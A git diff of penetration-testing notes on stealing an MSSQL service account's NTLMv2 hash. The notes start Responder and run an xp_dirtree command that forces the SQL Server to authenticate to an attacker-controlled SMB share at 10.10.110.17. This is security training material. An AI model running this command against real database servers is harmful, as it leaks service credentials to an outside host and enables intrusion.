@@ -11,7 +11,7 @@ We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_di
 When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
 
 1. Start [[1. Responder|Responder]]
-2. Cost:
+2. Run:
 ```cmd-session
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
 ```
